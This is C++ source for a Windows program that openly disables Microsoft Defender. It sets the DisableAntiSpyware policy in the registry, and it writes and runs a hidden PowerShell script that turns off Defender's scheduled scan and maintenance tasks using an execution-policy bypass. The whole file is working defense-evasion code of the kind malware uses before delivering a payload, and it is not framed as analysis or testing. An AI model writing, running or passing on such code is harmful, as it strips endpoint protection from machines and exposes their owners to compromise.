#include "Windows.h"
#include <cstdlib>
#include <iostream>

using namespace std;

void disableAntiSpyware()
{
    cout << "Disabling anti-spyware..." << endl;

    LPCSTR lpSubKey = "SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender";
    HKEY hKey;

    long lstatus = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        lpSubKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS | KEY_WOW64_64KEY,
        NULL,
        &hKey,
        NULL
    );

    if ( lstatus != ERROR_SUCCESS )
    {
        cout << "Creating key failed and exited with an error code: " << GetLastError() << endl;
        exit(0);
    }

    LPCSTR lpValueName = "DisableAntiSpyware";
    DWORD dwData = 1;

    lstatus = RegSetValueExA(
        hKey,
        lpValueName,
        0,
        REG_DWORD,
        (LPBYTE)&dwData,
        sizeof(dwData)
    );

    if ( lstatus != ERROR_SUCCESS )
    {
        cout << "Setting the key failed and exited with error code: " << GetLastError() << endl;
        exit(0);
    }

    RegCloseKey(hKey);
}

void disableWindowsDefenderGP()
{
    cout << "Disabling Windows Defender..." << endl;
    cout << endl;

    disableAntiSpyware();

    cout << endl;
    cout << "Disabled Windows Defender with Group Policies" << endl;
}


void executeShellCommands()
{
    string tasks[] = {"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
                    "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
                    "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
                    "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification"};
    int size = sizeof(tasks)/sizeof(tasks[0]);
    string command;

    for ( int i=0; i<size ; i++ )
    {
        string delimiter = "\\";
        string task;
        string taskPath = tasks[i];
        size_t pos = 0;

        while ( (pos = tasks[i].find(delimiter)) != string::npos )
        {
            task = tasks[i].substr(0, pos);
            tasks[i].erase(0, pos + delimiter.length());
        }

        string::size_type sop = taskPath.find(tasks[i]);
        
        if ( sop != string::npos )
            taskPath.erase(sop, tasks[i].length());

        command += "Disable-ScheduledTask -TaskName \"" + tasks[i] + "\" -TaskPath \"" + taskPath + "\"";
        command += "\n";
    }
    
    LPCSTR lpFileName = "temp.ps1";
    HANDLE handler = CreateFile(
        lpFileName,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_NEW,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if ( handler == INVALID_HANDLE_VALUE )
    {
        cout << "Creating the file failed and exited with error code: " << GetLastError() << endl;
        exit(0);
    }

    DWORD numberOfBytes;
    LPDWORD numberOfBytesWritten = 0;
    LPCSTR commandBuffer = command.c_str();
    numberOfBytes = command.length();

    bool writeFile = WriteFile(
        handler,
        commandBuffer,
        numberOfBytes,
        numberOfBytesWritten,
        NULL
    );

    if ( !writeFile )
    {
        cout << "Failed to write to the file and exite with error code: " << GetLastError() << endl;
        CloseHandle(handler);
        exit(0);
    }
    
    CloseHandle(handler);
    cout << command << endl;
    cout << endl;
    system("powershell -ExecutionPolicy Bypass -F temp.ps1");
    remove(lpFileName);
}

int main()
{
    cout << "Now, Lets kill the windows defender..." << endl;
    cout << endl;

    executeShellCommands();
    disableWindowsDefenderGP();

    return 0;
}